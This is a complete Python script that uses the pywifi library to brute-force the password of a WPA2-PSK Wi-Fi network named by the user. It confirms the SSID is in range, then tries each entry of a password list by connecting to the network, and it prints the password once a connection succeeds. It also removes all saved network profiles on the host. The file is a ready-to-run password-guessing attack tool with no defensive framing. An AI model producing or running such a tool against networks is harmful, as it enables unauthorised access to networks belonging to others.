import sys
import time
import pywifi
from pywifi import const
import logging

# Suppress pywifi logging messages
logging.getLogger('pywifi').setLevel(logging.CRITICAL)

sys.stdout.reconfigure(encoding='utf-8')

def is_ssid_available(ssid):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    
    # Scan for available networks
    iface.scan()
    time.sleep(2)  # Wait for the scan to complete
    scan_results = iface.scan_results()
    
    # Check if the target SSID is in the scan results
    for network in scan_results:
        if network.ssid == ssid:
            return True
    return False

def check_password(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    
    # Disconnect from any existing network
    iface.disconnect()
    time.sleep(0.05)  # Reduced sleep time for faster disconnection

    # Create a new profile for the target network
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    
    # Remove all existing network profiles and add the new one
    iface.remove_all_network_profiles()
    temp_profile = iface.add_network_profile(profile)
    
    # Attempt to connect
    iface.connect(temp_profile)
    
    # Wait for connection status
    start_time = time.time()
    while time.time() - start_time < 1:  # Wait for a maximum of 1 second
        if iface.status() == const.IFACE_CONNECTED:
            print(f"Password found successfully: {password}")
            iface.disconnect()
            return True
        time.sleep(0.05)  # Check every 0.05 seconds (50 milliseconds)
    
    # If connection fails, return False
    iface.disconnect()
    return False

def brute_force_wifi(ssid, password_file):
    # Check if the SSID is available
    if not is_ssid_available(ssid):
        print(f"Error: The SSID '{ssid}' is not available or not in range.")
        return
    
    c = 1
    with open(password_file, 'r', encoding='utf-8') as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        print(f"SSID: {ssid}, trying password {c}: {password}")
        c += 1
        
        if check_password(ssid, password):
            break

if __name__ == "__main__":
    # Ask the user for the SSID and password file path
    ssid = input("Enter the SSID of the target Wi-Fi network: ")
    password_file = input("Enter the path to the password list file: ")
    
    # Start brute-forcing
    brute_force_wifi(ssid, password_file)